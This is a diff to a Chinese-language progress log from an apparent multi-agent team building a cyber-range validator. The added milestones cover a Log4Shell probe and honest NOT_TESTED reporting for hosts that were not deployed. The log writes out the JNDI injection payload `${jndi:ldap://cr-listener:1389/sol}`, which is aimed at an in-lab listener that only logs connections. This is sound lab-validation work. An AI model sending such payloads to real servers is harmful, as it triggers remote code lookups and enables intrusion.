@@ -157,3 +157,24 @@ scenario-eng@592e1c7 併入 main（77a3ab7）後已 `git merge main`。
 ### 需其他人配合的介面變更（已回報 Lead）
 - **frontend-eng**：驗證器現在只對「動作專屬攻擊檢查」用 category `behavior`；良性服務存活改 category `connectivity`。前端 behavior_repro 分頁（categories=["behavior"]）因此只會顯示攻擊行為，與其提問「個別攻擊行為…能觀察到嗎」對齊；env_build 分頁會包含服務存活。報告摘要文字已改誠實，前端摘要/「可重現」顯示請一併對齊。
 - Log4Shell 要在產品流程內真實重現，需 infra-eng 在計畫內提供 in-lab JNDI listener 主機（目前以 Phase 3 獨立 harness 覆蓋，產品流程標 NOT_TESTED）。
+
+## 里程碑 9：Log4Shell 探針接進產品驗證流程（用 infra cr-listener）
+
+已 `git merge agent/infra-eng`（含平台元件 cr-listener：計畫含 `vuln-log4shell-solr` 時 IaC 自動加入，只在該漏洞主機實驗網路、不發布埠、只記錄連線不回內容）。介面：`manager.callback_listener(sid)`、`manager.callback_events(sid, since)`（事件含 `peer_host`＝發起連線的情境主機 id）。
+
+實作（`apps/api/app/validator/runner.py`）：
+- 新增 `_log4shell_solr_probe`（註冊進 `_ATTACK_PROBES['vuln-log4shell-solr']`）：守門先行；先送良性 `action=STATUS`→要求 0 回呼；再送 `action=${jndi:ldap://cr-listener:1389/sol}`→要求出現 `peer_host==目標主機` 的 LDAP 回呼才判 PASS（真實重現）。良性已產生回呼→FAIL（無法歸因）；注入已送但無回呼→FAIL；**無 listener／listener 未執行→NOT_TESTED**（不假 PASS）。`_ATTACK_PROBES_NEEDING_INFRA` 清空（改由探針自身在缺 infra 時回 NOT_TESTED）。
+- 攻擊請求由來源（attacker）容器發出，回呼由 solr→cr-listener，listener 不回內容（無 class 載入／RCE）。
+
+測試：
+- **真實產品流程** `tests/e2e/test_log4shell_product_validation.py`：API 部署真實 vulhub solr＋自動 cr-listener，驗證器探針觀測到來自 solr 的真實 LDAP 回呼→動作 a1=PASS、behavior_repro=PASS；良性請求 0 回呼；實跑 46s 通過。
+- 全套件 **205 passed, 3 subtests passed**。測完環境清除、無殘留。
+
+## 里程碑 10：未部署主機如實呈現（infra not_deployed_hosts）
+
+已 `git merge agent/infra-eng`（IaC 報告新增 `not_deployed_hosts`、`skipped_connections`、`deployed_host_ids`）。驗證器（`runner.py`）：
+- 每台未部署主機新增 `service_up` NOT_TESTED 檢查（附計畫原因）；故 **env_build 在有主機未部署時不為單純 PASS**，彙總為 PARTIAL，如實呈現「已部署的通過、N 台未部署」。
+- 連到／自未部署主機的路徑：connectivity 標 NOT_TESTED 並寫明「主機未部署：<原因>」（不再誤報 container not running）；以未部署主機為目標且有情境動作者，攻擊行為標 NOT_TESTED（目標未部署）。
+- 以未部署主機為目標的情境動作 → action NOT_TESTED，observed 寫明未部署原因；full_chain 因此不可能 PASS。
+- 報告新增 `not_deployed`、`skipped_connections`、`deployed_host_ids` 欄位；fidelity.summary 寫明「已部署 X 台、未部署 N 台」。
+- 測試：新增真實產品流程 `tests/e2e/test_not_deployed_validation.py`（計畫含 deployable:false 的 db → 部署 attacker+web、db 不部署；驗證 service-up-db NOT_TESTED、env_build PARTIAL、action-a2 NOT_TESTED 附原因、full_chain≠PASS、not_deployed 列出 db）。全套件 **210 passed, 3 subtests**。
